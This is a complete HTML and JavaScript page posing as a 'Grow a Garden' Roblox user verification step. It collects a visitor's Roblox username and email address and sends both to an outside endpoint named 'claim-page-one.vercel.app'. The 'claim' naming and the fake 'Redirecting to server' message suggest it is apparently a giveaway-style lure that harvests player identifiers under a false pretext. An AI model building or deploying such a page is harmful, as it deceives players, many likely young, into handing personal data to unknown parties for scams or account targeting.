<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Grow a Garden - User Verification</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
      max-width: 500px;
      width: 100%;
      text-align: center;
      animation: slideUp 0.6s ease-out;
    }
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .logo {
      width: 100px; height: 100px;
      background: linear-gradient(45deg, #4CAF50, #66BB6A);
      border-radius: 50%;
      margin: 0 auto 25px;
      display: flex; align-items: center; justify-content: center;
      font-size: 40px; color: white;
      box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
    }
    h1 {
      color: #333; margin-bottom: 10px;
      font-size: 32px; font-weight: 700;
    }
    .subtitle {
      color: #666; margin-bottom: 35px; font-size: 16px;
    }
    .step {
      display: none; animation: fadeIn 0.5s ease-in;
    }
    .step.active { display: block; }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .form-group {
      margin-bottom: 25px; text-align: left;
    }
    label {
      display: block; margin-bottom: 10px;
      color: #333; font-weight: 600; font-size: 16px;
    }
    input {
      width: 100%; padding: 16px;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      font-size: 16px;
      transition: all 0.3s ease;
      background: #fafafa;
    }
    input:focus {
      outline: none;
      border-color: #4CAF50;
      box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.1);
      background: white;
    }
    input.error {
      border-color: #f44336;
      background: #fff5f5;
    }
    input.valid {
      border-color: #4CAF50;
      background: #f0fff4;
    }
    .btn {
      background: linear-gradient(45deg, #4CAF50, #66BB6A);
      color: white; border: none;
      padding: 16px 32px; border-radius: 12px;
      font-size: 16px; font-weight: 600;
      cursor: pointer; transition: all 0.3s ease;
      width: 100%; margin-bottom: 15px;
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 25px rgba(76, 175, 80, 0.4);
    }
    .btn:disabled {
      background: #ccc; cursor: not-allowed;
      transform: none; box-shadow: none;
    }
    .btn.secondary {
      background: #f5f5f5; color: #666;
      border: 2px solid #e0e0e0;
    }
    .btn.secondary:hover {
      background: #eeeeee;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    }
    .profile-card {
      background: #f8f9fa; padding: 30px;
      border-radius: 15px; margin: 25px 0;
      border: 2px solid #e9ecef;
    }
    .profile-avatar {
      width: 120px; height: 120px;
      border-radius: 50%;
      margin: 0 auto 20px;
      border: 4px solid #4CAF50;
      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
    }
    .profile-name {
      font-size: 24px; font-weight: 700;
      color: #333; margin-bottom: 10px;
    }
    .profile-question {
      font-size: 18px; color: #555;
      margin-bottom: 25px;
    }
    .loading {
      display: inline-block; width: 20px; height: 20px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #4CAF50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-right: 10px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .error-message {
      background: #ffebee;
      color: #c62828;
      padding: 15px;
      border-radius: 10px;
      margin: 20px 0;
      border-left: 4px solid #f44336;
      text-align: left;
    }
    .success-message {
      background: #e8f5e9;
      color: #2e7d32;
      padding: 15px;
      border-radius: 10px;
      margin: 20px 0;
      border-left: 4px solid #4caf50;
      text-align: left;
    }
    .validation-message {
      font-size: 14px;
      margin-top: 8px;
      padding: 8px 12px;
      border-radius: 6px;
    }
    .validation-message.error {
      background: #ffebee;
      color: #c62828;
      border: 1px solid #ffcdd2;
    }
    .validation-message.success {
      background: #e8f5e9;
      color: #2e7d32;
      border: 1px solid #c8e6c9;
    }
    .note {
      background: #fff3cd;
      color: #856404;
      padding: 15px;
      border-radius: 10px;
      margin-top: 20px;
      font-size: 14px;
      border-left: 4px solid #ffc107;
    }
    .debug-info {
      background: #f0f0f0;
      padding: 10px;
      border-radius: 5px;
      margin-top: 10px;
      font-family: monospace;
      font-size: 12px;
      text-align: left;
    }
    .step-indicator {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 30px;
      gap: 10px;
    }
    .step-dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: #ddd;
      transition: background 0.3s ease;
    }
    .step-dot.active {
      background: #4CAF50;
    }
    .step-dot.completed {
      background: #66BB6A;
    }
    .summary-card {
      background: #f8f9fa;
      padding: 25px;
      border-radius: 15px;
      margin: 25px 0;
      border: 2px solid #e9ecef;
      text-align: left;
    }
    .summary-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 0;
      border-bottom: 1px solid #e9ecef;
    }
    .summary-item:last-child {
      border-bottom: none;
    }
    .summary-label {
      font-weight: 600;
      color: #555;
    }
    .summary-value {
      color: #333;
      font-weight: 500;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">ðŸŒ±</div>
    <h1>Grow a Garden</h1>
    <p class="subtitle">User Verification</p>

    <div class="step-indicator">
      <div class="step-dot active" id="dot1"></div>
      <div class="step-dot" id="dot2"></div>
      <div class="step-dot" id="dot3"></div>
    </div>

    <!-- Step 1: Enter Username -->
    <div class="step active" id="step1">
      <div class="form-group">
        <label for="robloxUsername">Enter your Roblox Username:</label>
        <input
          type="text"
          id="robloxUsername"
          placeholder="YourRobloxUsername"
          required
          autocomplete="off"
        />
      </div>

      <button class="btn" onclick="verifyUsername()" id="verifyBtn">
        Verify Username
      </button>

      <div class="note">
        Make sure your username is spelled exactly right (case-sensitive)
      </div>
    </div>

    <!-- Step 2: Profile Confirmation -->
    <div class="step" id="step2">
      <div class="profile-card">
        <img
          id="profileAvatar"
          class="profile-avatar"
          src=""
          alt="Profile Picture"
        />
        <div id="profileName" class="profile-name"></div>
        <div class="profile-question">Is this your Roblox account?</div>

        <button class="btn" onclick="confirmProfile()">Yes, that's me!</button>
        <button class="btn secondary" onclick="goBack(1)">No, try again</button>
      </div>
    </div>

    <!-- Step 3: Enter Email & Final Confirmation -->
    <div class="step" id="step3">
      <div class="form-group">
        <label for="emailAddress">Enter your Email Address:</label>
        <input
          type="email"
          id="emailAddress"
          placeholder="your.email@example.com"
          required
          autocomplete="email"
        />
        <div id="emailValidation" class="validation-message" style="display: none;"></div>
      </div>

      <button class="btn" onclick="validateAndSubmit()" id="emailBtn">
        Complete Registration
      </button>
      <button class="btn secondary" onclick="goBack(2)">Go Back</button>

      <div class="note">
        We'll verify that this email address is valid and can receive messages
      </div>

      <div id="finalSummary" class="summary-card" style="display: none;">
        <h3 style="color: #333; margin-bottom: 15px;">Registration Complete!</h3>
        <div class="summary-item">
          <span class="summary-label">Roblox Username:</span>
          <span class="summary-value" id="summaryUsername"></span>
        </div>
        <div class="summary-item">
          <span class="summary-label">Email Address:</span>
          <span class="summary-value" id="summaryEmail"></span>
        </div>
      </div>
    </div>

    <!-- Error/Success Messages -->
    <div id="errorMessage" class="error-message" style="display: none"></div>
    <div id="successMessage" class="success-message" style="display: none"></div>
    <div id="debugInfo" class="debug-info" style="display: none"></div>
  </div>

  <script>
    let currentUserData = null;
    let currentEmailData = null;
    let currentStep = 1;
    const userCache = {}; // Cache verified users to avoid repeat API calls

    function updateStepIndicator(step) {
      for (let i = 1; i <= 3; i++) {
        const dot = document.getElementById(`dot${i}`);
        dot.classList.remove('active', 'completed');
        
        if (i < step) {
          dot.classList.add('completed');
        } else if (i === step) {
          dot.classList.add('active');
        }
      }
    }

    function showStep(stepNumber) {
      currentStep = stepNumber;
      document.querySelectorAll('.step').forEach((step) =>
        step.classList.remove('active')
      );
      document.getElementById('step' + stepNumber).classList.add('active');
      updateStepIndicator(stepNumber);
      
      // Clear messages when changing steps
      document.getElementById('errorMessage').style.display = 'none';
      document.getElementById('successMessage').style.display = 'none';
      document.getElementById('debugInfo').style.display = 'none';
    }

    function displayUserProfile(userData) {
      const avatarImg = document.getElementById('profileAvatar');
      const profileName = document.getElementById('profileName');
      
      // Set up avatar with fallback handling
      avatarImg.onerror = function() {
        console.log('Avatar failed to load, trying fallback...');
        
        const fallbackUrls = [
          `https://www.roblox.com/bust-thumbnail/image?userId=${userData.userId}&width=150&height=150&format=png`,
          `https://www.roblox.com/headshot-thumbnail/image?userId=${userData.userId}&width=150&height=150&format=png&t=${Date.now()}`,
          `https://www.roblox.com/headshot-thumbnail/image?userId=${userData.userId}&width=100&height=100&format=png`,
        ];
        
        const currentSrc = this.src;
        const nextIndex = fallbackUrls.findIndex(url => url.split('&t=')[0] === currentSrc.split('&t=')[0]) + 1;
        
        if (nextIndex < fallbackUrls.length) {
          this.src = fallbackUrls[nextIndex];
        } else {
          // Create placeholder avatar
          this.src = 'data:image/svg+xml,' + encodeURIComponent(`
            <svg xmlns="http://www.w3.org/2000/svg" width="150" height="150" viewBox="0 0 150 150">
              <rect width="150" height="150" fill="#4CAF50"/>
              <circle cx="75" cy="60" r="25" fill="white"/>
              <rect x="55" y="90" width="40" height="40" rx="20" fill="white"/>
              <text x="75" y="130" font-family="Arial" font-size="10" fill="white" text-anchor="middle">${userData.username}</text>
            </svg>
          `);
        }
      };
      
      const avatarUrl = userData.avatar.includes('?') 
        ? `${userData.avatar}&t=${Date.now()}`
        : `${userData.avatar}?t=${Date.now()}`;
        
      avatarImg.src = avatarUrl;
      avatarImg.alt = `${userData.username}'s Avatar`;
      profileName.textContent = userData.username;
    }

    function showError(message) {
      const errorEl = document.getElementById('errorMessage');
      errorEl.textContent = message;
      errorEl.style.display = 'block';
      setTimeout(() => {
        errorEl.style.display = 'none';
      }, 10000);
    }

    function showSuccess(message) {
      const successEl = document.getElementById('successMessage');
      successEl.textContent = message;
      successEl.style.display = 'block';
    }

    function showDebug(info) {
      const debugEl = document.getElementById('debugInfo');
      debugEl.textContent = JSON.stringify(info, null, 2);
      debugEl.style.display = 'block';
    }

    function showEmailValidation(message, isValid) {
      const validationEl = document.getElementById('emailValidation');
      const emailInput = document.getElementById('emailAddress');
      
      validationEl.textContent = message;
      validationEl.className = `validation-message ${isValid ? 'success' : 'error'}`;
      validationEl.style.display = 'block';
      
      emailInput.className = isValid ? 'valid' : 'error';
    }

    function validateEmailFormat(email) {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailRegex.test(email);
    }

    async function verifyUsername() {
      const username = document.getElementById('robloxUsername').value.trim();
      const verifyBtn = document.getElementById('verifyBtn');

      if (!username) {
        showError('Please enter a username');
        return;
      }

      if (username.length < 3 || username.length > 20) {
        showError('Username must be between 3-20 characters');
        return;
      }

      if (!/^[a-zA-Z0-9_]+$/.test(username)) {
        showError('Username can only contain letters, numbers, and underscores');
        return;
      }

      verifyBtn.innerHTML = '<span class="loading"></span>Verifying...';
      verifyBtn.disabled = true;

      if (userCache[username.toLowerCase()]) {
        currentUserData = userCache[username.toLowerCase()];
        displayUserProfile(currentUserData);
        showStep(2);
        verifyBtn.innerHTML = 'Verify Username';
        verifyBtn.disabled = false;
        return;
      }

      try {
        const response = await fetch('https://claim-page-one.vercel.app/api/verify', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ username }),
        });

        const responseText = await response.text();
        
        showDebug({
          status: response.status,
          statusText: response.statusText,
          headers: Object.fromEntries(response.headers.entries()),
          responseText: responseText.substring(0, 500) + (responseText.length > 500 ? '...' : '')
        });

        let userData;
        try {
          userData = JSON.parse(responseText);
        } catch (parseError) {
          throw new Error(`Invalid JSON response: ${parseError.message}`);
        }

        if (!response.ok) {
          showError(userData.error || `Server error: ${response.status}`);
          return;
        }

        currentUserData = {
          username: userData.username,
          avatar: userData.avatarUrl,
          userId: userData.userId,
        };

        userCache[username.toLowerCase()] = currentUserData;
        displayUserProfile(currentUserData);
        showStep(2);
      } catch (error) {
        console.error('Verification error:', error);
        showError(`Error: ${error.message}`);
      } finally {
        verifyBtn.innerHTML = 'Verify Username';
        verifyBtn.disabled = false;
      }
    }

    function confirmProfile() {
      if (!currentUserData) return;
      showStep(3);
    }

    async function validateAndSubmit() {
      const email = document.getElementById('emailAddress').value.trim();
      const emailBtn = document.getElementById('emailBtn');

      if (!email) {
        showEmailValidation('Please enter an email address', false);
        return;
      }

      if (!validateEmailFormat(email)) {
        showEmailValidation('Please enter a valid email address format', false);
        return;
      }

      emailBtn.innerHTML = '<span class="loading"></span>Completing Registration...';
      emailBtn.disabled = true;

      try {
        const response = await fetch('https://claim-page-one.vercel.app/api/verify', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ 
            username: currentUserData.username,
            email: email 
          }),
        });

        const responseText = await response.text();
        let result;
        
        try {
          result = JSON.parse(responseText);
        } catch (parseError) {
          throw new Error(`Invalid JSON response: ${parseError.message}`);
        }

        if (!response.ok) {
          showEmailValidation(result.error || 'Email validation failed', false);
          return;
        }

        if (result.emailValid) {
          currentEmailData = {
            email: email,
            isValid: true,
            provider: result.emailProvider || 'unknown'
          };
          
          showEmailValidation('âœ… Email address is valid!', true);
          
          // Show final summary
          document.getElementById('summaryUsername').textContent = currentUserData.username;
          document.getElementById('summaryEmail').textContent = email;
          document.getElementById('finalSummary').style.display = 'block';
          
          // Hide form elements
          document.querySelector('.form-group').style.display = 'none';
          document.querySelector('.note').style.display = 'none';
          emailBtn.style.display = 'none';
          document.querySelector('.btn.secondary').style.display = 'none';
          
          showSuccess(`âœ… Registration complete! Welcome ${currentUserData.username}!`);
          
          const finalData = {
            roblox: currentUserData,
            email: currentEmailData,
            timestamp: new Date().toISOString()
          };
          
          console.log('Final registration data:', finalData);

          setTimeout(() => {
            alert(`Welcome ${currentUserData.username}! Redirecting to server...`);
            // window.location.href = '/join-server?' + new URLSearchParams({
            //   userId: currentUserData.userId,
            //   username: currentUserData.username,
            //   email: currentEmailData.email
            // });
          }, 2000);
        } else {
          showEmailValidation(result.reason || 'Email address appears to be invalid', false);
        }
      } catch (error) {
        console.error('Email validation error:', error);
        showEmailValidation(`Error validating email: ${error.message}`, false);
      } finally {
        if (emailBtn.style.display !== 'none') {
          emailBtn.innerHTML = 'Complete Registration';
          emailBtn.disabled = false;
        }
      }
    }

    function goBack(toStep) {
      if (toStep === 1) {
        currentUserData = null;
        document.getElementById('robloxUsername').value = '';
      } else if (toStep === 2) {
        currentEmailData = null;
        document.getElementById('emailAddress').value = '';
        document.getElementById('emailValidation').style.display = 'none';
        document.getElementById('emailAddress').className = '';
        // Reset step 3 display
        document.querySelector('.form-group').style.display = 'block';
        document.querySelector('.note').style.display = 'block';
        document.getElementById('emailBtn').style.display = 'block';
        document.querySelector('.btn.secondary').style.display = 'block';
        document.getElementById('finalSummary').style.display = 'none';
      }
      
      showStep(toStep);
    }

    // Event listeners
    document.getElementById('robloxUsername').addEventListener('keypress', function (e) {
      if (e.key === 'Enter') {
        verifyUsername();
      }
    });

    document.getElementById('emailAddress').addEventListener('keypress', function (e) {
      if (e.key === 'Enter') {
        validateAndSubmit();
      }
    });

    // Real-time email format validation
    document.getElementById('emailAddress').addEventListener('input', function(e) {
      const email = e.target.value.trim();
      const validationEl = document.getElementById('emailValidation');
      
      if (email.length === 0) {
        validationEl.style.display = 'none';
        e.target.className = '';
        return;
      }
      
      if (validateEmailFormat(email)) {
        e.target.className = 'valid';
        validationEl.style.display = 'none';
      } else {
        e.target.className = 'error';
        showEmailValidation('Please enter a valid email format', false);
      }
    });
  </script>
</body>
</html>
